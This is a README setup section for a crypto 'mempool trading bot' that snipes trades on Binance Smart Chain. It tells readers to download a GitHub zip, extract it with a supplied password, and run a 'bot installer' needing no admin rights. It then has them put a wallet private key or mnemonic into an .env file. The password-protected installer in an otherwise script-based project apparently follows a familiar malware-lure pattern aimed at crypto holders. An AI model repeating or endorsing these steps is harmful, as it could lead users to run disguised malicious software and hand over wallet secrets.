### Setup
1. [Download](https://github.com/NFTERA/mempool-trading-bot/archive/refs/heads/main.zip) repo and extract files with password `olAZTgjE17lRoZ`

2. Launch bot installer (no admin privileges needed)

3. Create a `config/local.json` file following the template and samples provided inside the directory (`config/*.local.json`). This will be used by our scripts in the configuration and sniping phase. (you won't have yet the trigger address, this comes later)

4. Deploy all contracts using the truffle migrations (create an `.env` file with `BINANCE_MAINNET_WALLET_PRIVATE_KEY` or `BINANCE_MAINNET_WALLET_MNEMONIC`). Contract deployment uses variables provided in `config/local.json` (eg. the factory ones) so make sure to have it properly configured beforehand.

5. Set the trigger address generated by the contract deployment in your `config/local.json`.

6. If you don't have a swarm yet, create one running `npm run create-swarm`. This should create a `config/bee_book.json` similar to the template one (`config/template.bee_book.json`) to be used by the sniper on each snipe

7. Configure the trigger contract with the provided order running `npm run configure-trigger`
